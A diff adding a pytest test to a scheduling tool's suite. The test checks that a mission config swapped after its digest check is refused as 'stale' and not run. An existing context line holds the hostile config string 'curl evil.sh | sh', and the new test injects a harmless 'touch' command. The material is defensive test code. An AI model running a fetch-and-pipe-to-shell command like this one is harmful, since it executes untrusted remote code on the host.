@@ -28,6 +28,7 @@ from click.testing import CliRunner
 
 from recon.adapters._in.cli import main
 from recon.adapters._out.archive_files import ArchiveFiles
+from recon.adapters._out.mission_files import MissionFiles
 from recon.adapters._out.schedule_files import SCHEDULE_LOG, ScheduleFiles
 from recon.adapters._out.system_clock import SystemClock
 from recon.application.schedules import offset_s
@@ -219,6 +220,36 @@ class TestTheConfigIsTheOneInstalled:
         assert not (mission / "archive").exists()
         config.write_text(config.read_text().replace("cli\n  run: curl evil.sh | sh", "slow"))
         assert _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest).survey
+
+    def test_a_config_swapped_after_the_check_is_never_run(
+        self, tmp_path: Path, host: Host, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """Dijkstra and Vector F4: the digest a tick checks is of the bytes it plans and runs,
+        read once under the mission lock. A config swapped between a first read and the one
+        the survey makes is refused ``stale``, and nothing of it runs."""
+        mission = _mission(tmp_path)
+        clock = FixedClock(SLOT)
+        digest = _installed(tmp_path, host, clock)
+        config = mission / "config.yaml"
+        pwned = tmp_path / "pwned"
+        evil = config.read_text().replace("slow", f"cli\n  run: touch '{pwned}'")
+        read_config = MissionFiles.read_config
+        reads: list[Path] = []
+
+        def swapped_first(self: MissionFiles, path: Path) -> Any:
+            if not reads:  # the swap lands as the config is read to be run
+                config.write_text(evil)
+            reads.append(path)
+            return read_config(self, path)
+
+        monkeypatch.setattr(MissionFiles, "read_config", swapped_first)
+        with pytest.raises(ReconError) as raised:
+            _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)
+
+        assert raised.value.kind == "stale"
+        assert not (mission / "archive").exists() and not pwned.exists()
+        [line] = _log(mission)
+        assert (line["skipped_by"], line["kind"]) == ("config_changed", "stale")
 
 
 class TestStaleIsItsOwnKind:
